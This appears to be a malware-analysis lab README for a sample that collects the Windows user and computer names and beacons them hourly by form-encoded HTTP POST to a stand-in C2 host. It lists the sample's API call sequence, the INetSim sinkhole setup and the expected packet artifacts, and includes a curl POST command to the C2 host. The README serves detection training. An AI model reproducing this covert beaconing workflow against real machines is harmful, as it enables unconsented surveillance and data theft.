# A04.4b HTTP Form-Encoded Data Exfiltration

## Summary

Collects basic host identity information, serializes the collected
data using URL-style form encoding, and transmits it to a controlled
laboratory server through HTTP POST requests.

The sample demonstrates application-layer data exfiltration behavior
commonly associated with information stealers, spyware, remote-access
trojans, browser-oriented malware, and lightweight implants that send
collected data through ordinary web request formats.

The exfiltration workflow performs the following operations:

* Retrieves the current Windows user name
* Retrieves the local computer name
* Generates a local execution timestamp
* Constructs form-encoded request bodies
* Resolves the laboratory C2 hostname
* Establishes an HTTP connection
* Sends data using HTTP POST requests
* Uses the `application/x-www-form-urlencoded` content type
* Creates a background worker thread
* Sends periodic host heartbeat messages
* Keeps the process active for continued transmission

The HTTP communication is implemented using the Windows WinINet API.

The primary transmission operation is performed using:

```text
HttpSendRequestA()
```

All network communication is directed to the controlled laboratory
hostname:

```text
c2.lab.local
```

No real external command-and-control server is contacted.

---

## Payload Summary

The payload behavior consists of collecting basic system identity
information and transmitting two types of form-encoded messages to a
laboratory HTTP server.

### Initial Login Information Message

Immediately after execution, the sample sends a form body containing:

* Current user name
* Computer name
* Execution timestamp

The request is sent to:

```text
http://c2.lab.local/api/v1/report
```

### Periodic Location Heartbeat Message

After the initial transmission, the sample creates a background
worker thread that sends a heartbeat message once every hour.

The heartbeat contains:

* Current user name
* Computer name
* Static status value
* Current timestamp

The static status value is:

```text
location_heartbeat
```

The sample does not collect geographic coordinates. The location
message functions only as a controlled telemetry heartbeat.

No persistence, credential extraction, privilege escalation,
file encryption, or destructive functionality is performed.

---

## Network Configuration

### Destination Host

```text
c2.lab.local
```

### Destination Port

```text
80/TCP
```

### HTTP Method

```text
POST
```

### Request Path

```text
/api/v1/report
```

### Content Type

```text
application/x-www-form-urlencoded
```

### User-Agent

```text
DataPipelineAgent/1.1
```

---

## Form-Encoded Payload Structure

Form-encoded HTTP data is represented as a sequence of key-value
pairs separated by ampersands:

```text
key1=value1&key2=value2&key3=value3
```

Unlike the JSON variant, the payload does not use braces, quotation
marks, or nested JSON fields.

### Initial Payload Format

```text
username=<user>&computer_name=<host>&login_time=<timestamp>
```

### Heartbeat Payload Format

```text
username=<user>&computer_name=<host>&status=location_heartbeat&time=<timestamp>
```

The sample replaces the space between the date and time with an
underscore to avoid disrupting the form body:

```text
2026-07-30_13:45:12
```

The implementation does not perform complete percent encoding of all
form values. Therefore, unusual user or computer names containing
reserved URL characters could alter the serialized request body.

---

## To Execute A04_4b

### Step 1 — Confirm laboratory name resolution

From the Windows analysis VM:

```powershell
Resolve-DnsName c2.lab.local
```

The hostname should resolve to the INetSim server:

```text
192.168.67.5
```

### Step 2 — Launch the form-encoded exfiltration sample

```powershell
.\A04-Credential-Theft-Spyware-Keylogger\A04_4b\bin\A04_4b_Form_Encoded_Exfil.exe
```

The sample does not require command-line arguments.

The console window is hidden during execution.

### Step 3 — Allow the initial HTTP POST to complete

The first form-encoded payload is transmitted immediately after the
sample retrieves the current user and computer names.

### Step 4 — Terminate the sample after artifact collection

The sample remains active to support hourly heartbeat transmission.

Terminate it manually after the required dynamic artifacts have been
captured.

For example:

```powershell
Stop-Process -Name A04_4b_Form_Encoded_Exfil
```

---

## Expected Initial Form Payload

```text
username=lab-user&computer_name=WIN11-LAB&login_time=2026-07-30_13:45:12
```

---

## Expected Heartbeat Form Payload

```text
username=lab-user&computer_name=WIN11-LAB&status=location_heartbeat&time=2026-07-30_14:45:12
```

The exact values depend on the user account, computer name, and
execution time of the Windows analysis system.

---

## Expected HTTP Request

```text
POST /api/v1/report HTTP/1.1
Host: c2.lab.local
User-Agent: DataPipelineAgent/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

username=lab-user&computer_name=WIN11-LAB&login_time=2026-07-30_13:45:12
```

---

## Expected Dynamic Artifacts

### Process Activity

The sample creates:

* Main executable process
* Background worker thread

Relevant Windows API activity includes:

```text
CreateThread()
Sleep()
```

The main thread remains active using repeated 10-second sleep
intervals.

The worker thread sleeps for:

```text
3,600,000 milliseconds
```

This corresponds to one hour between heartbeat transmissions.

### DNS Activity

The sample attempts to resolve:

```text
c2.lab.local
```

Expected DNS behavior includes:

* DNS query for `c2.lab.local`
* DNS response containing `192.168.67.5`

### Network Activity

Expected network activity includes:

* Outbound TCP connection to `192.168.67.5:80`
* HTTP POST request to `/api/v1/report`
* `Content-Type: application/x-www-form-urlencoded`
* User-Agent value `DataPipelineAgent/1.1`
* Form-encoded data in the HTTP request body

### Filesystem Activity

The sample does not create a local staging file.

The primary filesystem artifacts are generated on the INetSim server
when it stores captured HTTP POST bodies.

---


# High-Level HTTP Form-Encoded Exfiltration Flow

1. Start the form-encoded exfiltration executable

   ```text
   A04_4b_Form_Encoded_Exfil.exe
   ```

2. Hide the console window using:

   ```text
   ShowWindow(SW_HIDE)
   ```

3. Retrieve the current user name using:

   ```text
   GetUserNameA()
   ```

4. Retrieve the local computer name using:

   ```text
   GetComputerNameA()
   ```

5. Generate a timestamp using:

   ```text
   time()
   localtime_s()
   strftime()
   ```

6. Format the timestamp as:

   ```text
   YYYY-MM-DD_HH:MM:SS
   ```

7. Construct the initial form body:

   ```text
   username=<user>&computer_name=<host>&login_time=<timestamp>
   ```

8. Initialize a WinINet session using:

   ```text
   InternetOpenA()
   ```

9. Configure the WinINet user-agent as:

   ```text
   DataPipelineAgent/1.1
   ```

10. Establish an HTTP connection to:

    ```text
    c2.lab.local:80
    ```

    using:

    ```text
    InternetConnectA()
    ```

11. Create an HTTP POST request for:

    ```text
    /api/v1/report
    ```

    using:

    ```text
    HttpOpenRequestA()
    ```

12. Add the request header:

    ```text
    Content-Type: application/x-www-form-urlencoded
    ```

13. Transmit the form body using:

    ```text
    HttpSendRequestA()
    ```

14. Close the HTTP request and connection handles using:

    ```text
    InternetCloseHandle()
    ```

15. Create a background worker thread using:

    ```text
    CreateThread()
    ```

16. Construct a heartbeat form body containing:

    * User name
    * Computer name
    * `location_heartbeat` status
    * Current timestamp

17. Send the heartbeat form body to the same HTTP endpoint

18. Pause the worker thread for one hour using:

    ```text
    Sleep(3600000)
    ```

19. Repeat the heartbeat transmission indefinitely

20. Keep the main thread active using repeated calls to:

    ```text
    Sleep(10000)
    ```

21. Continue execution until the process is manually terminated

---

# INetSim Laboratory Configuration

## Step 1 — Configure INetSim Services

Edit the INetSim configuration file:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Configure the service bind address:

```text
service_bind_address 192.168.67.5
```

Enable DNS and HTTP services:

```text
start_service dns
start_service http
```

Configure the default DNS response:

```text
dns_default_ip 192.168.67.5
```

Add a static DNS record for the controlled C2 hostname:

```text
dns_static c2.lab.local 192.168.67.5
```

---

## Step 2 — Configure the HTTP Response

Create the static response file:

```bash
sudo nano /var/lib/inetsim/http/fakefiles/report_OK.json
```

Add the following response body:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

Map the API path to the static response:

```text
http_static_fakefile /api/v1/report report_OK.json application/json
```

Restart INetSim after applying the configuration:

```bash
sudo systemctl restart inetsim
```

Alternatively, when running INetSim manually:

```bash
sudo inetsim
```

The response remains JSON even though the incoming request body is
form encoded. Request and response content types do not need to match.

---

## Step 3 — Test the HTTP Endpoint

From the Windows analysis VM, test the standard HTTP response:

```powershell
curl.exe http://c2.lab.local/api/v1/report
```

Expected response:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

Test a form-encoded HTTP POST request:

```powershell
curl.exe -X POST http://c2.lab.local/api/v1/report `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=tester&computer_name=WINLAB&status=manual_test"
```

---

## Step 4 — Monitor INetSim Activity

Monitor the INetSim service log:

```bash
sudo tail -f /var/log/inetsim/service.log
```

Expected entries should indicate:

* DNS resolution for `c2.lab.local`
* HTTP connection from the Windows analysis VM
* HTTP POST request to `/api/v1/report`
* Captured POST request data

---

## Step 5 — View Captured POST Data

Display all captured HTTP POST request bodies:

```bash
sudo cat /var/lib/inetsim/http/postdata/*
```

The stored content should include a form body similar to:

```text
username=lab-user&computer_name=WIN11-LAB&login_time=2026-07-30_13:45:12
```

A heartbeat request should appear similar to:

```text
username=lab-user&computer_name=WIN11-LAB&status=location_heartbeat&time=2026-07-30_14:45:12
```

---

## Step 6 — Delete Previous POST Data

Before beginning a new controlled execution, remove old captured POST
data:

```bash
sudo find /var/lib/inetsim/http/postdata -type f -delete
```

This prevents request bodies from previous executions from being
mixed with the current analysis run.

---

# Expected INetSim and PCAP Evidence

## INetSim Service Log

The INetSim log should record:

```text
DNS request for c2.lab.local
HTTP connection to port 80
POST request for /api/v1/report
```

## Captured POST Data

INetSim should create one or more files under:

```text
/var/lib/inetsim/http/postdata/
```

These files should contain the transmitted form-encoded request
bodies.

## Packet Capture

A corresponding packet capture should show:

1. DNS query for:

   ```text
   c2.lab.local
   ```

2. DNS response containing:

   ```text
   192.168.67.5
   ```

3. TCP three-way handshake with:

   ```text
   192.168.67.5:80
   ```

4. HTTP POST request to:

   ```text
   /api/v1/report
   ```

5. HTTP request header:

   ```text
   Content-Type: application/x-www-form-urlencoded
   ```

6. HTTP request body containing host identity fields separated by:

   ```text
   &
   ```

7. Key-value boundaries represented by:

   ```text
   =
   ```

8. HTTP response containing:

   ```json
   {
     "status": "ok",
     "task": "telemetry accepted"
   }
   ```

---

## Behavioral Distinction from A04_4a

A04_4a and A04_4b collect and transmit similar host information, but
use different HTTP body formats.

### A04_4a

```text
Content-Type: application/json
```

Example:

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB"
}
```

### A04_4b

```text
Content-Type: application/x-www-form-urlencoded
```

Example:

```text
username=lab-user&computer_name=WIN11-LAB
```

This distinction produces different static strings, packet-level
payload structures, parsing requirements, and content-type indicators
while preserving the same broader data-exfiltration behavior.
